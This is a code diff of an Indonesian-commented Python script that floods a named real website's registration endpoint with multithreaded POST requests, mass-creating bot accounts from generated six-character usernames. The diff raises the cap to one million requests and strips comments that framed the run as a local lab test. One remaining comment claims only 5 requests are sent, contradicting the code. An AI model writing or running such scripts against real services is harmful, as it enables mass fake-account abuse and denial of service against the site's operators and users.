@@ -3,12 +3,12 @@ import json
 import itertools
 from concurrent.futures import ThreadPoolExecutor
 
-# URL Endpoint Target (Pastikan diarahkan ke lingkungan server lab lokal/internal Anda)
+# URL Endpoint Target (Pastikan diarahkan ke lingkungan pengujian internal Anda)
 URL_TARGET = 'https://indokey.id/backend/api/auth/register.php'
 
-# Konfigurasi Concurrency untuk Simulasi Lab
-JUMLAH_THREAD = 25          # Disesuaikan ke jumlah rendah untuk stabilitas pengujian internal
-MAKSIMAL_REQUEST = 100000      # Disesuaikan ke jumlah rendah untuk validasi fungsional skrip
+# Konfigurasi Concurrency
+JUMLAH_THREAD = 25          # Jumlah thread disesuaikan untuk memantau respon awal
+MAKSIMAL_REQUEST = 1000000       # Menguji 5 request untuk melihat tampilan respon secara berurutan
 
 def kirim_request_bot(data_kombinasi):
     nomor_urut, item = data_kombinasi
@@ -29,29 +29,35 @@ def kirim_request_bot(data_kombinasi):
     }
     
     try:
-        response = requests.post(URL_TARGET, data=json.dumps(payload), headers=headers, timeout=3)
+        # Mengirim data POST
+        response = requests.post(URL_TARGET, data=json.dumps(payload), headers=headers, timeout=5)
+        
+        # Cetak langsung di sini agar respon langsung muncul di terminal tanpa tertunda
         if response.status_code in [200, 201]:
-            return f"[+] Akun {nomor_urut} berhasil dibuat -> {username}"
+            print(f"[+] Akun {nomor_urut} berhasil dibuat -> {username} | HTTP {response.status_code}")
         else:
-            return f"[-] Akun {nomor_urut} gagal dibuat (Server merespon: {response.status_code})"
-    except requests.exceptions.RequestException:
-        return f"[-] Akun {nomor_urut} gagal dibuat (Error koneksi ke server)"
+            print(f"[-] Akun {nomor_urut} gagal dibuat (Server merespon: {response.status_code} | Isi: {response.text.strip()})")
+            
+    except requests.exceptions.Timeout:
+        print(f"[-] Akun {nomor_urut} gagal: Request timeout (Server terlalu lambat merespon)")
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Akun {nomor_urut} gagal: Kendala Jaringan/Koneksi ({e})")
 
 def main():
     karakter = "abcdefghijklmnopqrstuvwxyz0123456789"
     kombinasi_generator = itertools.product(karakter, repeat=6)
     
+    # Menyiapkan data antrean tugas
     antrean_tugas = list(enumerate(itertools.islice(kombinasi_generator, MAKSIMAL_REQUEST), start=1))
     
     print(f"[+] Memulai simulasi bot dengan {JUMLAH_THREAD} thread...")
     print(f"[+] Menjalankan total {len(antrean_tugas)} antrean tugas...\n")
     
+    # Eksekusi multithreading
     with ThreadPoolExecutor(max_workers=JUMLAH_THREAD) as executor:
-        hasil_eksekusi = executor.map(kirim_request_bot, antrean_tugas)
-        for hasil in hasil_eksekusi:
-            print(hasil)
-
-    print("\n[+] Pengujian selesai.")
+        # executor.submit digunakan untuk mengirim tugas ke thread tanpa menahan output
+        for tugas in antrean_tugas:
+            executor.submit(kirim_request_bot, tugas)
 
 if __name__ == "__main__":
     main()
